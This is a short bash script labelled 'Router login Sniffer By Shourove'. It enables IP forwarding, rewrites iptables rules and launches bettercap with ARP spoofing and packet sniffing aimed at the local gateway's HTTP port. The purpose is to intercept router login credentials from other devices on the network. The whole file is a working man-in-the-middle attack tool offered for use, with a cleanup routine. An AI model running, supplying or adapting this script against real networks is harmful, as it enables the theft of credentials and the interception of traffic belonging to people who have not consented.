#!/bin/bash

# Check if running as root
if [ "$EUID" -ne 0 ]; then
  echo "Please run me as root"
  exit
fi

# Function to clean up when interrupted
cleanup() {
  echo -e "\nRestoring network settings..."
  iptables -F
  iptables -X
  sysctl -w net.ipv4.ip_forward=0 > /dev/null
  pkill -f bettercap
  echo "Cleanup complete."
  echo "Bye bye!"
  exit
}

# Trap Ctrl+C
trap cleanup SIGINT

# Detect network interface and gateway
INTERFACE=$(ip route show default | awk '/default/ {print $5}')
GATEWAY=$(ip route | grep default | awk '{print $3}')

# Verify detection
if [ -z "$INTERFACE" ] || [ -z "$GATEWAY" ]; then
  echo "Could not detect network interface or gateway!"
  exit 1
fi


echo "Router login Sniffer By Shourove"
echo "Interface: $INTERFACE"
echo "Gateway: $GATEWAY"

read -p "Press Enter to start the Attack (Ctrl+C to stop)..."

# Enable IP forwarding
sysctl -w net.ipv4.ip_forward=1 > /dev/null

# Configure iptables
iptables -F
iptables -X
iptables -A FORWARD -d $GATEWAY -p tcp --dport 80 -j ACCEPT
iptables -A FORWARD -j DROP

# Start bettercap with credentials sniffing
echo -e "\nStarting Bettercap... Monitoring $GATEWAY logins"
bettercap -iface $INTERFACE -eval "
net.probe on;
set arp.spoof.internal true;
arp.spoof on;
set net.sniff.bpf 'tcp and (host $GATEWAY and port 80)';
net.sniff on;
"

# Cleanup if bettercap exits normally
cleanup